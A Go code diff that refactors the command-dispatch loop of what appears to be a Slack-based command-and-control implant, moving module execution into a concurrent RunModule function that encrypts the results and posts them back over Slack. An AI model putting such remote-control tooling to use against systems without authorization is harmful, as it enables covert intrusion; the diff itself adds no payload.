@@ -181,23 +181,28 @@ func CheckCommands(t, clientID string) { //This is the main thing, reads the com
 				case "command":
 					go RunCommand(clientID, jobID, args)
 				default:
-					cmd := command.GetCommand(cmdType)
-					var result string
-					if cmd != nil {
-						result, err = cmd.Run(clientID, jobID, args)
-						if err != nil {
-							result = err.Error()
-						}
-					} else {
-						result = fmt.Sprintf("%s command unavailable", cmdType)
-					}
-					encryptedOutput, _ := crypto.Encrypt([]byte(result))
-					slack.SendResult(clientID, jobID, "output", encryptedOutput)
+					go RunModule(cmdType, clientID, jobID, args)
 				}
 			}
 		}
 	}
 	return
+}
+
+func RunModule(cmdType string, clientID string, jobID string, args []string) {
+	cmd := command.GetCommand(cmdType)
+	var result string
+	var err error
+	if cmd != nil {
+		result, err = cmd.Run(clientID, jobID, args)
+		if err != nil {
+			result = err.Error()
+		}
+	} else {
+		result = fmt.Sprintf("%s command unavailable", cmdType)
+	}
+	encryptedOutput, _ := crypto.Encrypt([]byte(result))
+	slack.SendResult(clientID, jobID, "output", encryptedOutput)
 }
 
 func RunCommand(clientID string, jobID string, args []string) { //This receives a command to run and runs it
